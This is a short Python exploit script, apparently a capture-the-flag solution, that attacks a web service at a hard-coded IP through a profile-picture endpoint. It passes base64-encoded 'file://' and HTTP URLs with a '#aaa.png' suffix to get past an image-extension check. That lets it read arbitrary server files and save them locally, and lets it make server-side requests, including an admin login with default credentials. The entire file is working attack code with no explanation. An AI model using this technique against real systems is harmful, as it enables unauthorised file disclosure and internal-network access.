import os
import requests
 
SERVER = 'http://35.205.32.11/'
OUT = './out'
 
 
def get_file(input_file):
    s = requests.session()
    res = s.get(SERVER + 'testProfilePng?u={}'.format('file://{}#aaa.png'.format(input_file).encode('base64'))).json()
    print(res)
 
    if not res['png']:
        raise Exception(res['err'])
 
    content = s.get(SERVER + 'profilePics/{}'.format(res['png'])).text
    print(content)
 
    input_file = OUT + os.path.dirname(input_file)
 
    if not os.path.exists(input_file):
        os.makedirs(input_file)
    with open(input_file + '/' + res['png'], "wb") as f:
        f.write(content)
 
 
def ssrf(input_file):
    s = requests.session()
    res = s.get(SERVER + 'testProfilePng?u={}'.format('{}#aaa.png'.format(input_file).encode('base64'))).json()
    print(res)
 
    if not res['png']:
        raise Exception(res['err'])
 
    content = s.get(SERVER + 'profilePics/{}'.format(res['png'])).text
    print(content)
 
 
def main():
    #print(get_file('/var/www/authstealer_exploit.js'))
    print(ssrf("http://35.205.32.11/./login.php?user_name=admin&password=password&submit=submit+%21"))
    print(ssrf("http://35.205.32.11/main"))
 
 
if __name__ == '__main__':
    main()